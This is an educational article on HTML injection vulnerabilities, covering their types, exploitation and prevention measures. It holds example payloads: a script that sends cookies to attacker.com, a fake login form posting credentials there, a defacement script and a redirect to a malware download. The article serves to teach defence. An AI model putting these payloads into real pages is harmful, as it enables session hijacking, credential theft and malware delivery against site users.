HTML Injection is a type of web security vulnerability that occurs when an attacker is able to inject arbitrary HTML code into a web application. This can lead to various malicious activities, including Cross-Site Scripting (XSS), data theft, and manipulation of the web page's content. HTML injection exploits the trust a user has in a web application by allowing the attacker to alter the content displayed to users.

### Key Characteristics of HTML Injection

1. **User Input Manipulation**: HTML injection typically occurs when user input is not properly validated or sanitized before being rendered on a web page. Attackers can exploit this by submitting malicious HTML code.

2. **Client-Side Execution**: The injected HTML is executed in the user's browser, which can lead to various attacks, including XSS, phishing, and session hijacking.

3. **Lack of Output Encoding**: If the application fails to encode output properly, it may render the injected HTML as executable code rather than displaying it as plain text.

### Types of HTML Injection

1. **Stored HTML Injection**:
   - The injected HTML code is stored on the server (e.g., in a database) and served to users when they access the affected page.
   - **Example**: An attacker submits a comment containing malicious HTML. When other users view the comment, the HTML executes in their browsers.

2. **Reflected HTML Injection**:
   - The injected HTML code is reflected off the server and executed immediately without being stored.
   - **Example**: An attacker crafts a URL that includes malicious HTML as a query parameter. When a victim clicks the link, the server reflects the HTML back in the response.

3. **DOM-based HTML Injection**:
   - This occurs when client-side scripts modify the Document Object Model (DOM) in a way that allows the execution of injected HTML. The attack does not involve the server.
   - **Example**: A web application uses JavaScript to read data from the URL and inject it into the page without proper sanitization.

### Exploitation Methods

Attackers can exploit HTML injection vulnerabilities using various methods:

1. **Session Hijacking**:
   - By injecting HTML that captures cookies or session tokens, an attacker can impersonate a user. For example, the script can send the captured data to the attacker's server.

   ```html
   <script>
       var img = new Image();
       img.src = "http://attacker.com/steal?cookie=" + document.cookie;
   </script>
   ```

2. **Phishing**:
   - An attacker can create a fake login form that appears on a legitimate site. When users enter their credentials, the attacker captures them.

   ```html
   <form action="http://attacker.com/steal" method="POST">
       <input type="text" name="username" placeholder="Username">
       <input type="password" name="password" placeholder="Password">
       <input type="submit" value="Login">
   </form>
   ```

3. **Defacement**:
   - Attackers can inject HTML that modifies the content of a webpage, displaying their own messages or images.

   ```html
   <script>
       document.body.innerHTML = "<h1>Hacked by Attacker</h1>";
   </script>
   ```

4. **Malware Distribution**:
   - An attacker can use HTML injection to redirect users to malicious sites or download malware.

   ```html
   <script>
       window.location.href = "http://malicious-site.com/malware.exe";
   </script>
   ```

### Prevention Measures

To protect against HTML injection vulnerabilities, developers should implement the following strategies:

1. **Input Validation and Sanitization**:
   - Validate and sanitize all user inputs to ensure they do not contain malicious HTML. Use libraries or frameworks that provide built-in protection against HTML injection.

2. **Output Encoding**:
   - Encode data before rendering it in the browser. This ensures that any potentially harmful characters are treated as plain text rather than executable code.

3. **Content Security Policy (CSP)**:
   - Implement a CSP to restrict the sources from which scripts can be loaded. This can help mitigate the impact of HTML injection attacks.

4. **Use HTTPOnly and Secure Flags**:
   - Set the `HTTPOnly` flag on cookies to prevent JavaScript from accessing them. Use the `Secure` flag to ensure cookies are only sent over HTTPS.

5. **Regular Security Audits**:
   - Conduct regular security assessments and code reviews to identify and remediate HTML injection vulnerabilities.

### Conclusion

HTML Injection is a significant web security vulnerability that can lead to various attacks, including XSS and data theft. Understanding the characteristics, types, and methods of exploitation is crucial for developers and security professionals. By implementing robust security measures, organizations can protect their applications and users from HTML injection attacks.